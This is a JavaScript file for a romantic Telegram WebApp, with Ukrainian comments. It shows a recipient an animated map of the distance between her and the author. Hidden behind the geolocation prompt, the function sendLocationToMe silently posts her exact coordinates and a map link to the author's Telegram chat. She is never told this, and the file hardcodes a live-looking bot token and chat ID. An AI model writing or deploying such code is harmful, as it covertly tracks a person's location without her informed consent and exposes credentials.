/* ==========================================================================
   НАЛАШТУВАННЯ — зміни свої координати тут
   ========================================================================== */
const MY_LAT = 49.6020421;   // <- твоя широта
const MY_LNG = 23.5569889;   // <- твоя довгота
const MY_LABEL  = "Я";
const HER_LABEL = "Ти";

// Щоб її координати автоматично прийшли ТОБІ в Telegram, заповни ці два поля.
// 1) Створи бота через @BotFather -> команда /newbot -> скопіюй токен сюди.
// 2) Напиши цьому боту будь-яке повідомлення (просто "привіт"), потім відкрий у браузері:
//    https://api.telegram.org/bot<ТВІЙ_ТОКЕН>/getUpdates
//    і знайди там своє "chat":{"id": ...} — це і є TELEGRAM_CHAT_ID.
// Якщо залишити поля порожніми — повідомлення просто не надсилатиметься,
// решта сценарію працюватиме як і раніше.
const TELEGRAM_BOT_TOKEN = "8523690428:AAFOdGpHrhJkS0pE4KJpvwA0_zEgB5llS0o";   // напр. "123456789:AAExampleTokenHere"
const TELEGRAM_CHAT_ID   = "6339139706";   // напр. "987654321"

/* ==========================================================================
   TELEGRAM WEBAPP
   ========================================================================== */
const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
if (tg) {
  try {
    tg.ready();
    tg.expand();
    tg.setBackgroundColor && tg.setBackgroundColor("#0b1020");
    tg.disableVerticalSwipes && tg.disableVerticalSwipes();
  } catch (e) { /* безпечний фолбек поза Telegram */ }
}

/* ==========================================================================
   ДОПОМІЖНІ ФУНКЦІЇ
   ========================================================================== */
const $ = (id) => document.getElementById(id);
const wait = (ms) => new Promise((res) => setTimeout(res, ms));

function showScreen(id) {
  document.querySelectorAll(".screen").forEach((s) => {
    if (s.id === id) {
      s.dataset.active = "true";
      s.removeAttribute("data-leaving");
    } else if (s.dataset.active === "true") {
      s.dataset.leaving = "true";
      setTimeout(() => { s.dataset.active = "false"; }, 700);
    } else {
      s.dataset.active = "false";
    }
  });
}

function reveal(el, cls = "visible") {
  if (el) el.classList.add(cls);
}

function haversineKm(lat1, lon1, lat2, lon2) {
  const R = 6371;
  const dLat = ((lat2 - lat1) * Math.PI) / 180;
  const dLon = ((lon2 - lon1) * Math.PI) / 180;
  const a =
    Math.sin(dLat / 2) ** 2 +
    Math.cos((lat1 * Math.PI) / 180) *
      Math.cos((lat2 * Math.PI) / 180) *
      Math.sin(dLon / 2) ** 2;
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

/* лінійна інтерполяція по дузі великого кола (спрощено, для карт малого масштабу — пряма інтерполяція ок) */
function lerpLatLng(a, b, t) {
  return [a[0] + (b[0] - a[0]) * t, a[1] + (b[1] - a[1]) * t];
}

/* легкий звук "whoosh" через Web Audio API, без зовнішніх файлів */
function playWhoosh() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const bufferSize = ctx.sampleRate * 0.9;
    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
    const data = buffer.getChannelData(0);
    for (let i = 0; i < bufferSize; i++) {
      data[i] = (Math.random() * 2 - 1) * (1 - i / bufferSize);
    }
    const noise = ctx.createBufferSource();
    noise.buffer = buffer;

    const filter = ctx.createBiquadFilter();
    filter.type = "bandpass";
    filter.frequency.setValueAtTime(200, ctx.currentTime);
    filter.frequency.exponentialRampToValueAtTime(2200, ctx.currentTime + 0.7);
    filter.Q.value = 0.8;

    const gain = ctx.createGain();
    gain.gain.setValueAtTime(0, ctx.currentTime);
    gain.gain.linearRampToValueAtTime(0.35, ctx.currentTime + 0.15);
    gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 0.9);

    noise.connect(filter).connect(gain).connect(ctx.destination);
    noise.start();
    noise.stop(ctx.currentTime + 0.9);
  } catch (e) { /* аудіо не критичне — тихо ігноруємо */ }
}

/* ==========================================================================
   ФОН: ЗІРКИ (canvas)
   ========================================================================== */
const canvas = $("bg-canvas");
const ctx2d = canvas.getContext("2d");
let stars = [];

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
function makeStars(n) {
  stars = Array.from({ length: n }, () => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height * 0.85,
    r: Math.random() * 1.4 + 0.3,
    phase: Math.random() * Math.PI * 2,
    speed: 0.4 + Math.random() * 0.8,
  }));
}
function drawStars(t) {
  ctx2d.clearRect(0, 0, canvas.width, canvas.height);
  for (const s of stars) {
    const twinkle = 0.5 + 0.5 * Math.sin(t * 0.001 * s.speed + s.phase);
    ctx2d.beginPath();
    ctx2d.arc(s.x, s.y, s.r, 0, Math.PI * 2);
    ctx2d.fillStyle = `rgba(255,255,255,${0.25 + twinkle * 0.6})`;
    ctx2d.shadowColor = "rgba(255,180,195,0.6)";
    ctx2d.shadowBlur = 3;
    ctx2d.fill();
  }
  requestAnimationFrame(drawStars);
}
resizeCanvas();
makeStars(90);
window.addEventListener("resize", () => {
  resizeCanvas();
  makeStars(90);
});
requestAnimationFrame(drawStars);

function showStars() { canvas.classList.add("visible"); }

/* ==========================================================================
   ДОЩ ІЗ СЕРДЕЧОК
   ========================================================================== */
const heartsLayer = $("hearts-rain");
let heartsRainTimer = null;

function spawnHeart() {
  const el = document.createElement("div");
  el.className = "falling-heart";
  el.textContent = "❤";
  const left = Math.random() * 100;
  const duration = 6 + Math.random() * 5;
  const drift = (Math.random() - 0.5) * 120;
  const size = 12 + Math.random() * 14;
  el.style.left = left + "vw";
  el.style.fontSize = size + "px";
  el.style.setProperty("--drift", drift + "px");
  el.style.animationDuration = duration + "s";
  heartsLayer.appendChild(el);
  setTimeout(() => el.remove(), duration * 1000 + 200);
}

function startHeartsRain(intensity = 220) {
  heartsLayer.classList.add("visible");
  if (heartsRainTimer) clearInterval(heartsRainTimer);
  heartsRainTimer = setInterval(spawnHeart, intensity);
}

function heartBurst(count = 40) {
  for (let i = 0; i < count; i++) {
    setTimeout(spawnHeart, i * 25);
  }
}

/* ==========================================================================
   ЕКРАН 1 — вступ
   ========================================================================== */
async function runScreen1() {
  showScreen("screen-1");
  await wait(2600);
  reveal($("text-1-1"));
  await wait(1500);
  reveal($("btn-start"));
}

$("btn-start").addEventListener("click", () => runScreen2());

/* ==========================================================================
   ЕКРАН 2 — запит локації
   ========================================================================== */
async function runScreen2() {
  showScreen("screen-2");
  await wait(500);
  reveal($("text-2-1"));
  await wait(1500);
  reveal($("text-2-2"));
  await wait(1200);
  reveal($("btn-share"));
}

$("btn-share").addEventListener("click", () => requestHerLocation());

let geoInFlight = false;

function requestHerLocation() {
  if (geoInFlight) return;
  geoInFlight = true;

  const hint = $("geo-hint");
  const btn = $("btn-share");
  btn.disabled = true;
  hint.textContent = "Визначаємо місцезнаходження...";
  hint.classList.remove("hint-error");
  reveal(hint);

  // Небезпечний контекст (http, не localhost) — геолокація там просто
  // не працює і жоден callback ніколи не спрацює, тому перевіряємо одразу.
  const isSecure =
    window.isSecureContext ||
    location.hostname === "localhost" ||
    location.hostname === "127.0.0.1";
  if (!isSecure) {
    finishWithError(
      "Геолокація працює лише через HTTPS. Опублікуй сторінку на GitHub Pages (https) і спробуй ще раз."
    );
    return;
  }

  if (!navigator.geolocation) {
    finishWithError("Цей браузер не підтримує геолокацію.");
    return;
  }

  let settled = false;

  // Жорсткий страховий тайм-аут: браузер сам може ніколи не викликати
  // ні success, ні error (трапляється в деяких WebView), тому 15с — стеля.
  const hardTimeout = setTimeout(() => {
    if (settled) return;
    settled = true;
    finishWithError("Забагато часу на визначення локації. Спробуй ще раз ❤️");
  }, 15000);

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      if (settled) return;
      settled = true;
      clearTimeout(hardTimeout);
      geoInFlight = false;
      proceedToMap(pos.coords.latitude, pos.coords.longitude);
    },
    (err) => {
      if (settled) return;
      settled = true;
      clearTimeout(hardTimeout);
      let msg = "Не вдалося отримати геолокацію. Спробуй ще раз ❤️";
      if (err && err.code === err.PERMISSION_DENIED) {
        msg = "Доступ до геолокації заборонено. Дозволь його в налаштуваннях і спробуй ще раз.";
      }
      finishWithError(msg);
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );

  function finishWithError(msg) {
    geoInFlight = false;
    btn.disabled = false;
    hint.textContent = msg;
    hint.classList.add("hint-error");
  }
}

/* надіслати мені в Telegram її координати, щойно вона поділилася локацією */
async function sendLocationToMe(lat, lng) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return; // не налаштовано — тихо пропускаємо

  const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
  const text =
    `❤️ Вона поділилася локацією!\n\n` +
    `Широта: ${lat}\n` +
    `Довгота: ${lng}\n\n` +
    `Подивитись на карті: ${mapsLink}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
    });
  } catch (e) {
    // не критично для сценарію — тихо ігноруємо, застосунок працює далі
  }
}

/* ==========================================================================
   ПЕРЕХІД — спалах світла
   ========================================================================== */
async function proceedToMap(herLat, herLng) {
  sendLocationToMe(herLat, herLng); // фонова відправка, не блокує сценарій
  playWhoosh();
  showScreen("screen-flash");
  await wait(1600);
  initAndAnimateMap(herLat, herLng);
}

/* ==========================================================================
   КАРТА
   ========================================================================== */
let leafletMap = null;

async function initAndAnimateMap(herLat, herLng) {
  showScreen("screen-map");
  await wait(150);

  const myPoint = [MY_LAT, MY_LNG];
  const herPoint = [herLat, herLng];

  if (!leafletMap) {
    leafletMap = L.map("map", {
      zoomControl: false,
      attributionControl: false,
      dragging: false,
      scrollWheelZoom: false,
      doubleClickZoom: false,
      touchZoom: false,
      boxZoom: false,
      keyboard: false,
      fadeAnimation: true,
    });

    L.tileLayer(
      "https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
      {
        subdomains: "abcd",
        maxZoom: 19,
        attribution: "",
      }
    ).addTo(leafletMap);
  }

  const bounds = L.latLngBounds([myPoint, herPoint]);
  leafletMap.fitBounds(bounds, { padding: [70, 70] });

  await wait(50);
  $("map").classList.add("visible");

  const glowIcon = (extraClass) =>
    L.divIcon({
      className: "",
      html: `<div class="geo-marker ${extraClass}"></div>`,
      iconSize: [16, 16],
      iconAnchor: [8, 8],
    });

  const myMarker = L.marker(myPoint, { icon: glowIcon("") }).addTo(leafletMap);
  const herMarker = L.marker(herPoint, { icon: glowIcon("") }).addTo(leafletMap);

  await wait(900);
  myMarker.getElement()?.querySelector(".geo-marker")?.classList.add("lit");

  await wait(900);
  herMarker.getElement()?.querySelector(".geo-marker")?.classList.add("lit");

  await wait(700);

  // Поступове малювання лінії
  const steps = 60;
  const path = Array.from({ length: steps + 1 }, (_, i) => lerpLatLng(myPoint, herPoint, i / steps));
  const line = L.polyline([myPoint], {
    color: "#ff6b81",
    weight: 2.4,
    opacity: 0.85,
  }).addTo(leafletMap);

  // Летюче сердце по лінії
  const heartIcon = L.divIcon({
    className: "",
    html: `<div class="flying-heart-icon" style="font-size:20px;">❤️</div>`,
    iconSize: [24, 24],
    iconAnchor: [12, 12],
  });
  const heartMarker = L.marker(myPoint, { icon: heartIcon }).addTo(leafletMap);

  for (let i = 1; i <= steps; i++) {
    line.addLatLng(path[i]);
    heartMarker.setLatLng(path[i]);
    await wait(14);
  }
  leafletMap.removeLayer(heartMarker);

  await wait(300);

  // Літачок зі шлейфом
  const planeIcon = L.divIcon({
    className: "",
    html: `<div class="plane-trail-icon" style="font-size:20px; transform: rotate(90deg);">✈️</div>`,
    iconSize: [24, 24],
    iconAnchor: [12, 12],
  });
  const planeMarker = L.marker(myPoint, { icon: planeIcon }).addTo(leafletMap);
  const trail = L.polyline([myPoint], {
    color: "#ffffff",
    weight: 1.4,
    opacity: 0.5,
    dashArray: "1,6",
  }).addTo(leafletMap);

  for (let i = 1; i <= steps; i++) {
    planeMarker.setLatLng(path[i]);
    trail.addLatLng(path[i]);
    await wait(11);
  }
  leafletMap.removeLayer(planeMarker);

  await wait(400);

  // Наближення карти
  leafletMap.flyToBounds(bounds, { padding: [40, 40], duration: 1.4 });
  await wait(1700);

  // Підрахунок відстані
  const distanceKm = Math.round(haversineKm(MY_LAT, MY_LNG, herLat, herLng));
  reveal($("distance-wrap"));
  await animateCounter($("distance-number"), distanceKm, 1800);

  await wait(2600);
  await goToMessageScreen();
}

function animateCounter(el, target, duration) {
  return new Promise((resolve) => {
    const start = performance.now();
    function frame(now) {
      const p = Math.min(1, (now - start) / duration);
      const eased = 1 - Math.pow(1 - p, 3);
      el.textContent = Math.round(eased * target);
      if (p < 1) {
        requestAnimationFrame(frame);
      } else {
        el.textContent = target;
        resolve();
      }
    }
    requestAnimationFrame(frame);
  });
}

/* ==========================================================================
   ЕКРАН ПОСЛАННЯ
   ========================================================================== */
async function goToMessageScreen() {
  showScreen("screen-message");
  showStars();
  startHeartsRain(260);

  await wait(500);
  reveal($("msg-heart"));
  await wait(900);
  reveal($("msg-1"));
  await wait(3200);
  reveal($("msg-2"));
  await wait(2800);
  reveal($("msg-3"));
  await wait(3200);

  await runBigHeart();
}

/* ==========================================================================
   ВЕЛИКЕ СЕРЦЕ
   ========================================================================== */
function spawnHeartParticles() {
  const layer = $("heart-particles");
  const n = 14;
  for (let i = 0; i < n; i++) {
    const p = document.createElement("div");
    p.className = "particle";
    const angle = (Math.PI * 2 * i) / n + Math.random() * 0.3;
    const dist = 60 + Math.random() * 40;
    p.style.setProperty("--px", Math.cos(angle) * dist + "px");
    p.style.setProperty("--py", Math.sin(angle) * dist + "px");
    layer.appendChild(p);
    setTimeout(() => p.remove(), 1200);
  }
}

async function runBigHeart() {
  showScreen("screen-bigheart");
  await wait(300);
  reveal($("big-heart"));

  let beats = 0;
  const beatInterval = setInterval(() => {
    spawnHeartParticles();
    beats++;
    if (beats >= 4) clearInterval(beatInterval);
  }, 1300);

  await wait(300 + 1300 * 4);
  await runFinalScreen();
}

/* ==========================================================================
   ФІНАЛЬНИЙ ЕКРАН
   ========================================================================== */
async function runFinalScreen() {
  showScreen("screen-final");
  const title = document.querySelector(".final-title");
  const sub = document.querySelector(".final-sub");
  await wait(400);
  reveal(title);
  await wait(900);
  reveal(sub);
  await wait(900);
  reveal($("btn-final"));
}

$("btn-final").addEventListener("click", async () => {
  $("btn-final").disabled = true;
  heartBurst(70);
  startHeartsRain(90);
  await wait(1400);
  showScreen("screen-envelope");
  await wait(500);
  reveal($("envelope"));
  await wait(900);
  $("envelope").classList.add("open");
});

/* ==========================================================================
   СТАРТ
   ========================================================================== */
runScreen1();
